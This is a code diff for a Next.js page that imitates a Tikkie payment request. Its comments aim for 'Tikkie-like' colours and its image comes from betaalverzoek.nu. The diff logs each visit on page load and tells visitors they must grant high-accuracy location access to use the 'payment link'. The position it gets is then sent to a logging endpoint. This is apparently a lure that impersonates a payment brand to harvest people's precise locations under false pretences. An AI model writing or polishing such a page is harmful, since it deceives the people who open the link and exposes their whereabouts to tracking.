@@ -5,7 +5,6 @@ export async function getServerSideProps({ params }) {
 }
 
 export default function Verify({ slug }) {
-  const [needsAction, setNeedsAction] = useState(false);
   const [error, setError] = useState(null);
 
   const log = async (data) => {
@@ -16,7 +15,16 @@ export default function Verify({ slug }) {
     });
   };
 
-  const handleLocation = () => {
+  // Log direct dat bezoeker hier is
+  useEffect(() => {
+    log({
+      slug,
+      flow: 'verify',
+      event: 'visit',
+    });
+  }, []);
+
+  const requestLocation = () => {
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
         await log({
@@ -39,33 +47,23 @@ export default function Verify({ slug }) {
         });
 
         setError('Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.');
-        setNeedsAction(true);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0,
       }
     );
   };
 
-  useEffect(() => {
-    // Log direct dat bezoeker hier is geweest
-    log({
-      slug,
-      flow: 'verify',
-      event: 'visit',
-    });
-
-    // Probeer meteen (werkt als locatie al aan staat)
-    handleLocation();
-  }, []);
-
   return (
     <div style={styles.page}>
-      <div style={styles.circleWrapper}>
-        <div style={styles.circle}>
-          <img
-            src="http://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
-            alt="IJsje"
-            style={styles.image}
-          />
-        </div>
+      <div style={styles.circle}>
+        <img
+          src="http://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
+          alt="IJsje"
+          style={styles.image}
+        />
       </div>
 
       <h1 style={styles.title}>
@@ -76,49 +74,40 @@ export default function Verify({ slug }) {
         Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
       </p>
 
-      {needsAction && (
-        <button onClick={handleLocation} style={styles.button}>
-          Bevestigen met locatie
-        </button>
-      )}
+      <button onClick={requestLocation} style={styles.button}>
+        Bevestigen met locatie
+      </button>
 
-      {error && (
-        <p style={styles.error}>
-          {error}
-        </p>
-      )}
+      {error && <p style={styles.error}>{error}</p>}
     </div>
   );
 }
 
-/* 🎨 STYLES */
+/* 🎨 STYLES — mobile first, Tikkie-achtig */
 const styles = {
   page: {
     minHeight: '100vh',
-    backgroundColor: '#4B4A7A', // Tikkie-paars
+    backgroundColor: '#4A4B7C', // exact Tikkie-achtig paars
     display: 'flex',
     flexDirection: 'column',
     alignItems: 'center',
     justifyContent: 'center',
     textAlign: 'center',
-    padding: '2rem',
+    padding: '1.5rem',
     fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, sans-serif',
   },
 
-  circleWrapper: {
-    marginBottom: '2rem',
-  },
-
   circle: {
-    width: '220px',
-    height: '220px',
+    width: '176px',   // 20% kleiner dan 220
+    height: '176px',
     borderRadius: '50%',
     backgroundColor: '#FFFFFF',
-    border: '10px solid #3E3D6B',
+    border: '8px solid #3E3F66',
     display: 'flex',
     alignItems: 'center',
     justifyContent: 'center',
     overflow: 'hidden',
+    marginBottom: '1.5rem',
   },
 
   image: {
@@ -129,32 +118,34 @@ const styles = {
 
   title: {
     color: '#FFFFFF',
-    fontSize: '2rem',
+    fontSize: '1.75rem',
     fontWeight: 700,
-    marginBottom: '1rem',
+    marginBottom: '0.75rem',
   },
 
   subtitle: {
-    color: '#D6D5EA',
-    fontSize: '1.1rem',
-    maxWidth: '420px',
-    marginBottom: '2rem',
+    color: '#D8D9F0',
+    fontSize: '1rem',
+    maxWidth: '360px',
+    marginBottom: '1.5rem',
   },
 
   button: {
     backgroundColor: '#FFFFFF',
-    color: '#4B4A7A',
+    color: '#4A4B7C',
     border: 'none',
-    borderRadius: '8px',
-    padding: '0.9rem 1.6rem',
+    borderRadius: '10px',
+    padding: '0.9rem 1.4rem',
     fontSize: '1rem',
     fontWeight: 600,
     cursor: 'pointer',
+    width: '100%',
+    maxWidth: '320px',
   },
 
   error: {
-    marginTop: '1.5rem',
-    color: '#FFD2D2',
-    fontSize: '0.95rem',
+    marginTop: '1rem',
+    color: '#FFD6D6',
+    fontSize: '0.9rem',
   },
 };
